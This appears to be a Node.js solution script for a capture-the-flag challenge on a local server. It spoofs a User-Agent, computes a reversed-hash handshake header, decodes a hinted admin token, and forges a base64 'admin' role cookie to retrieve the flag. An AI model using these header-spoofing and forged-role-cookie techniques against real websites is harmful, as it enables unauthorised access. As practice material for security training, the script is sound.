const axios = require("axios");
const { CookieJar } = require("tough-cookie");
const { wrapper } = require("axios-cookiejar-support");
const crypto = require("crypto");

const BASE_URL = "http://localhost:3000";

(async () => {
  try {
    // Create a cookie jar and wrap axios
    const jar = new CookieJar();
    const client = wrapper(axios.create({ jar }));

    // Stage 1: Use the required User-Agent
    await client.get(`${BASE_URL}/stage1`, {
      headers: {
        "User-Agent": "Elite-CTF-Browser",
      },
    });

    // Stage 2: Generate the handshake
    const secret = "handshake_secret";
    const reversedBase64Hash = Buffer.from(
      crypto.createHash("sha256").update(secret).digest("hex")
    )
      .toString("base64")
      .split("")
      .reverse()
      .join("");

    await client.get(`${BASE_URL}/stage2/verify`, {
      headers: {
        "X-CTF-Handshake": reversedBase64Hash,
      },
    });

    // Stage 3: Retrieve admin token and access the flag
    const timeRes = await client.get(`${BASE_URL}/time`);
    const reversedToken = Buffer.from(timeRes.data.hint, "base64")
      .toString()
      .split("")
      .reverse()
      .join("");

    await client
      .get(`${BASE_URL}/stage3/flag`, {
        headers: {
          "X-Admin-Token": reversedToken,
          Cookie: `user_role=${Buffer.from("admin").toString("base64")}`,
        },
      })
      .then((res) => {
        console.log("Flag:", res.data.flag);
      });
  } catch (err) {
    console.error(
      "Error during CTF solution:",
      err.response?.data || err.message
    );
  }
})();
